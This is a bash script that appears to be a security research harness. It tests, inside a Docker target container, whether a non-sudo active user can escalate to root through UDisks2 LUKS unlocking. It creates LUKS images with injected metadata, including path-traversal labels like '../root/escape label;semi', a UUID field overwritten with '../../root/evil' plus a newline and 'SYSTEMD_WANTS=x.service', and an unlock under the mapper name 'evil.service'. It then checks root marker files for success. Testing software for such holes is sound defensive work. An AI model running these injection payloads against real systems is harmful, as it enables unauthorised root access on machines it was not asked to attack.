#!/usr/bin/env bash
set -euo pipefail

container="${1:-ubuntu24-server-lpe-target}"
workspace="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
log="$workspace/logs/active-udisks-luks-unlock.out"
mkdir -p "$workspace/logs"

set +e
docker exec -i "$container" bash -s >"$log" 2>&1 <<'EOS'
set -euo pipefail

tmp=/tmp/active-udisks-luks-unlock
home=/home/selfauth/active-udisks-luks-unlock
root_marker=/root/active_udisks_luks_unlock_root
run_marker=/run/active_udisks_luks_unlock_root
tmp_marker=/tmp/active_udisks_luks_unlock_root
probe_since="$(date --iso-8601=seconds)"

uuids=(
  11111111-2222-3333-4444-555555555555
  22222222-3333-4444-5555-666666666666
  33333333-4444-5555-6666-777777777777
  44444444-5555-6666-7777-888888888888
)

cleanup_target() {
  set +e
  loginctl terminate-user selfauth >/dev/null 2>&1 || true
  systemctl start getty@tty1.service >/dev/null 2>&1 || true
  rm -f /home/selfauth/.bash_profile

  for uuid in "${uuids[@]}"; do
    cryptsetup close "luks-$uuid" >/dev/null 2>&1 || true
    dmsetup remove "luks-$uuid" >/dev/null 2>&1 || true
  done
  for name in active_luks_inner_setup evil.service root slash newline active-udisks-luks.service; do
    cryptsetup close "$name" >/dev/null 2>&1 || true
    dmsetup remove "$name" >/dev/null 2>&1 || true
  done

  losetup -a | awk -F: '/active-udisks-luks-unlock/ {print $1}' |
    xargs -r -n1 losetup -d >/dev/null 2>&1 || true

  rm -rf "$home" "$tmp" "$root_marker" "$run_marker" "$tmp_marker"
  systemctl reset-failed 'dev-mapper-luks*' 'dev-disk-by*' >/dev/null 2>&1 || true
}
trap cleanup_target EXIT
trap 'rc=$?; set +e; echo "PROBE_ERROR rc=$rc line=$LINENO"; [ -f "$tmp/root-prep.out" ] && cat "$tmp/root-prep.out"; exit "$rc"' ERR

rm -rf "$tmp" "$home" "$root_marker" "$run_marker" "$tmp_marker"
mkdir -p "$tmp" "$home"
chmod 1777 "$tmp"

id selfauth >/dev/null 2>&1 || useradd -m -s /bin/bash selfauth
echo selfauth:selfauth | chpasswd
usermod -G selfauth selfauth
chown -R selfauth:selfauth "$home"

{
  echo "## target/default proof"
  cat /etc/os-release | sed -n '1,8p'
  uname -a
  id attacker
  id selfauth
  getent group sudo admin 2>/dev/null || true
  echo

  echo "## default package versions"
  for pkg in udisks2 libudisks2-0 libblockdev-crypto3 cryptsetup cryptsetup-bin systemd udev policykit-1 polkitd; do
    dpkg-query -W -f='${binary:Package}\t${Version}\t${db:Status-Abbrev}\n' "$pkg" 2>&1 || true
  done | sort
  echo

  echo "## default UDisks service and D-Bus ownership"
  systemctl is-enabled udisks2.service 2>&1 || true
  systemctl is-active udisks2.service 2>&1 || true
  systemctl cat udisks2.service 2>&1 | sed -n '1,80p'
  sed -n '1,80p' /usr/share/dbus-1/system-services/org.freedesktop.UDisks2.service
  busctl --system list 2>/dev/null | awk '$1=="org.freedesktop.UDisks2" || $1=="org.freedesktop.login1" || $1=="org.freedesktop.PolicyKit1"'
  echo

  echo "## default polkit actions"
  awk '/org.freedesktop.udisks2.loop-setup/{flag=1} flag{print} /<\/action>/{if(flag) exit}' /usr/share/polkit-1/actions/org.freedesktop.UDisks2.policy
  awk '/org.freedesktop.udisks2.encrypted-unlock/{flag=1} flag{print} /<\/action>/{if(flag) exit}' /usr/share/polkit-1/actions/org.freedesktop.UDisks2.policy
  echo

  echo "## root udev/systemd consumers for LUKS/dm metadata"
  echo "### /usr/lib/udev/rules.d/60-persistent-storage.rules"
  nl -ba /usr/lib/udev/rules.d/60-persistent-storage.rules | sed -n '132,142p'
  echo "### /usr/lib/udev/rules.d/55-dm.rules"
  nl -ba /usr/lib/udev/rules.d/55-dm.rules | sed -n '107,138p'
  echo "### /usr/lib/udev/rules.d/60-persistent-storage-dm.rules"
  nl -ba /usr/lib/udev/rules.d/60-persistent-storage-dm.rules | sed -n '17,32p'
  echo "### /usr/lib/udev/rules.d/99-systemd.rules"
  nl -ba /usr/lib/udev/rules.d/99-systemd.rules | sed -n '19,38p'
  echo
} >"$tmp/root-prep.out" 2>&1

printf pass >"$home/key"
chown selfauth:selfauth "$home/key"

runuser -u selfauth -- bash -s <<'EOSUSER' >>"$tmp/root-prep.out" 2>&1
set -euo pipefail
cd /home/selfauth/active-udisks-luks-unlock

make_luks2() {
  local img="$1" uuid="$2" label="$3" subsystem="$4"
  truncate -s 48M "$img"
  cryptsetup luksFormat --type luks2 --batch-mode \
    --pbkdf pbkdf2 --pbkdf-force-iterations 1000 \
    --uuid "$uuid" --label "$label" --subsystem "$subsystem" \
    --key-file key "$img"
}

echo "## selfauth-created LUKS fixtures"
make_luks2 luks-default.img 11111111-2222-3333-4444-555555555555 normal sub
make_luks2 luks-label-escape.img 22222222-3333-4444-5555-666666666666 '../root/escape label;semi' 'sub/systemd'
make_luks2 luks-label-unit.img 33333333-4444-5555-6666-777777777777 'active-udisks-luks.service' 'cryptroot.target'
make_luks2 luks-name-option.img 44444444-5555-6666-7777-888888888888 name-option x

truncate -s 32M luks-invaliduuid-luks1.img
cryptsetup luksFormat --type luks1 --batch-mode \
  --pbkdf-force-iterations 1000 --key-file key luks-invaliduuid-luks1.img
python3 - <<'PY'
from pathlib import Path
p = Path("luks-invaliduuid-luks1.img")
b = bytearray(p.read_bytes())
mal = b"../../root/evil\nSYSTEMD_WANTS=x.service"
b[168:208] = mal[:40].ljust(40, b"X")
p.write_bytes(b)
PY

find . -maxdepth 1 -type f -name '*.img' -printf '%f %s bytes\n' | sort
for img in *.img; do
  echo "### cryptsetup luksDump $img"
  cryptsetup luksDump "$img" 2>&1 | sed -n '1,35p'
  echo "### blkid -p -o export $img"
  blkid -p -o export "$img" 2>&1 || true
done

echo "## cryptsetup UUID option grammar gate"
truncate -s 32M uuid-bad-option.img
set +e
cryptsetup luksFormat --type luks2 --batch-mode \
  --pbkdf pbkdf2 --pbkdf-force-iterations 1000 \
  --uuid '../root/evil' --key-file key uuid-bad-option.img 2>&1
echo "uuid_bad_option_rc=$?"
rm -f uuid-bad-option.img
EOSUSER

cat >"$home/manifest.tsv" <<EOFMANIFEST
default	$home/luks-default.img	udisksctl
label_escape	$home/luks-label-escape.img	udisksctl
label_unit	$home/luks-label-unit.img	udisksctl
name_option	$home/luks-name-option.img	gdbus-name
invalid_luks1_uuid	$home/luks-invaliduuid-luks1.img	invalid
EOFMANIFEST
chown selfauth:selfauth "$home/manifest.tsv"

cat >"$home/probe.sh" <<'EOSPROBE'
#!/bin/bash
set +e

home=/home/selfauth/active-udisks-luks-unlock
loops=/tmp/active-udisks-luks-unlock/loops.tsv
: > "$loops"

echo "## active selfauth session"
id
tty
echo "XDG_SESSION_ID=$XDG_SESSION_ID"
loginctl show-session "$XDG_SESSION_ID" -p Id -p User -p Name -p Seat -p TTY -p Active -p State -p Type -p Class -p Remote
echo

echo "## active-user loop setup"
while IFS=$'\t' read -r case_name img mode; do
  echo "### $case_name $img"
  udisksctl loop-setup -f "$img" --no-user-interaction
  rc=$?
  echo "loop_setup_rc=$rc"
  dev="$(losetup -j "$img" | awk -F: 'NR==1 {print $1}')"
  echo "loop_device=$dev"
  printf '%s\t%s\t%s\t%s\n' "$case_name" "$img" "$mode" "$dev" >> "$loops"
done < "$home/manifest.tsv"
udevadm settle --timeout=20 || true
echo

echo "## UDisks Encrypted interface"
while IFS=$'\t' read -r case_name img mode dev; do
  [ -n "$dev" ] || continue
  obj="/org/freedesktop/UDisks2/block_devices/$(basename "$dev")"
  echo "### $case_name $dev $obj"
  gdbus introspect --system --dest org.freedesktop.UDisks2 --object-path "$obj" |
    sed -n '/interface org.freedesktop.UDisks2.Encrypted/,/};/p'
done < "$loops"
echo

echo "## unlock attempts from active non-sudo user"
while IFS=$'\t' read -r case_name img mode dev; do
  [ -n "$dev" ] || continue
  obj="/org/freedesktop/UDisks2/block_devices/$(basename "$dev")"
  echo "### unlock $case_name $dev mode=$mode"
  case "$mode" in
    gdbus-name)
      gdbus call --system --dest org.freedesktop.UDisks2 --object-path "$obj" \
        --method org.freedesktop.UDisks2.Encrypted.Unlock \
        'pass' "{'name': <'evil.service'>, 'allow-discards': <true>}" 2>&1
      echo "unlock_rc=$?"
      ;;
    invalid)
      udisksctl unlock -b "$dev" --key-file "$home/key" --no-user-interaction 2>&1
      echo "unlock_rc=$?"
      ;;
    *)
      udisksctl unlock -b "$dev" --key-file "$home/key" --no-user-interaction 2>&1
      echo "unlock_rc=$?"
      ;;
  esac
done < "$loops"
udevadm settle --timeout=20 || true
sleep 3
echo

echo "## user-visible mapper and symlink state"
ls -l /dev/mapper 2>&1 || true
find /dev/disk -maxdepth 2 -type l 2>/dev/null | sort | while read -r p; do
  t="$(readlink "$p")"
  case "$p $t" in
    *11111111*|*22222222*|*33333333*|*44444444*|*active-udisks-luks*|*escape*|*inner*|*name-option*|*normal*|*root*|*evil*|*luks*)
      printf '%s -> %s\n' "$p" "$t"
      ;;
  esac
done
echo

echo "## user marker check"
id > /tmp/active_udisks_luks_user_marker
ls -l /root/active_udisks_luks_unlock_root /run/active_udisks_luks_unlock_root /tmp/active_udisks_luks_unlock_root 2>&1 || true
EOSPROBE
chmod 0755 "$home/probe.sh"
chown selfauth:selfauth "$home/probe.sh"

systemctl stop getty@tty1.service >/dev/null 2>&1 || true
set +e
timeout 160 openvt -c 1 -s -f -w -- /bin/sh -c "su - selfauth -c '$home/probe.sh' > '$tmp/user.out' 2>&1; echo \$? > '$tmp/user.rc'"
openvt_rc=$?
set -e
systemctl start getty@tty1.service >/dev/null 2>&1 || true
loginctl terminate-user selfauth >/dev/null 2>&1 || true

{
  cat "$tmp/root-prep.out"
  echo
  echo "## active trigger output"
  echo "openvt_rc=$openvt_rc user_rc=$(cat "$tmp/user.rc" 2>/dev/null || echo missing)"
  cat "$tmp/user.out" 2>&1 || true
  echo

  echo "## root post-unlock dm state"
  dmsetup ls --tree 2>&1 || true
  dmsetup info -c --noheadings -o name,uuid,attr,major,minor 2>&1 |
    grep -E 'CRYPT|luks-|evil|root|active-udisks|name-option' || true
  for uuid in "${uuids[@]}"; do
    echo "### cryptsetup status luks-$uuid"
    cryptsetup status "luks-$uuid" 2>&1 || true
  done
  echo

  echo "## root udev properties for relevant loop/dm devices"
  for dev in $(awk -F '\t' '{print $4}' "$tmp/loops.tsv" 2>/dev/null | sort -u); do
    [ -e "$dev" ] || continue
    props="$(udevadm info --query=property --name "$dev" 2>/dev/null |
      grep -E '^(DEVNAME|DEVLINKS|ID_FS|DM_|SYSTEMD|UDISKS)' | sort || true)"
    case "$props" in
      *11111111*|*22222222*|*33333333*|*44444444*|*active-udisks-luks*|*escape*|*inner*|*name-option*|*normal*|*root*|*evil*|*luks*)
        echo "### $dev"
        printf '%s\n' "$props"
        ;;
    esac
  done
  for sys in /sys/block/dm-*; do
    [ -e "$sys" ] || continue
    props="$(udevadm info --query=property --path "$sys" 2>/dev/null |
      grep -E '^(DEVNAME|DEVLINKS|ID_FS|DM_|SYSTEMD|UDISKS)' | sort || true)"
    case "$props" in
      *11111111*|*22222222*|*33333333*|*44444444*|*active-udisks-luks*|*escape*|*inner*|*name-option*|*normal*|*root*|*evil*|*luks*)
        echo "### $sys"
        printf '%s\n' "$props"
        ;;
    esac
  done
  echo

  echo "## root symlink and systemd unit state"
  find /dev/disk -maxdepth 2 -type l 2>/dev/null | sort | while read -r p; do
    t="$(readlink "$p")"
    case "$p $t" in
      *11111111*|*22222222*|*33333333*|*44444444*|*active-udisks-luks*|*escape*|*inner*|*name-option*|*normal*|*root*|*evil*|*luks*)
        printf '%s -> %s\n' "$p" "$t"
        ;;
    esac
  done
  systemctl list-units '*luks*' '*dev-mapper*' --all --no-pager 2>&1 |
    grep -E '11111111|22222222|33333333|44444444|evil|active-udisks|luks' || true
  echo

  echo "## root marker and unexpected write checks"
  for p in "$root_marker" "$run_marker" "$tmp_marker" /root/escape /root/evil /run/active_udisks_luks_user_marker; do
    if [ -e "$p" ]; then
      echo "ROOT_PROOF_PRESENT $p"
      ls -l "$p"
      cat "$p" 2>/dev/null || true
    else
      echo "ROOT_PROOF_ABSENT $p"
    fi
  done
  echo

  echo "## udisks journal tail"
  journalctl -u udisks2.service --since "$probe_since" --no-pager 2>&1 |
    grep -E 'active-udisks-luks-unlock|Unlocked|Set up loop|Error|luks|loop' || true
  echo

  echo "## cleanup health before cleanup"
  systemctl is-system-running || true
  systemctl --failed --no-legend || true
} >"$tmp/root.out" 2>&1

cat "$tmp/root.out"
cleanup_target

echo
echo "## cleanup verification"
losetup -a | grep active-udisks-luks-unlock || true
for uuid in "${uuids[@]}"; do
  dmsetup info "luks-$uuid" >/dev/null 2>&1 && echo "MAPPER_STILL_PRESENT luks-$uuid" || true
done
for p in "$root_marker" "$run_marker" "$tmp_marker" /root/escape /root/evil; do
  [ -e "$p" ] && echo "PATH_STILL_PRESENT $p" || true
done
systemctl is-system-running || true
systemctl --failed --no-legend || true
EOS
rc=$?
set -e

sed -n '1,420p' "$log"
if [ "$(wc -l <"$log")" -gt 420 ]; then
  echo "[truncated: full log at $log]"
fi
exit "$rc"
